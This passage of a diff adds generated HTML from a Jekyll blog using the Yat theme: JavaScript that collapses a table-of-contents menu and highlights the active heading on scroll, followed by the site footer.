+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
+</section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2020-2022 @Jeevan</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      
+    </div>
+  </div>
+</footer>
+</body>
+</html>
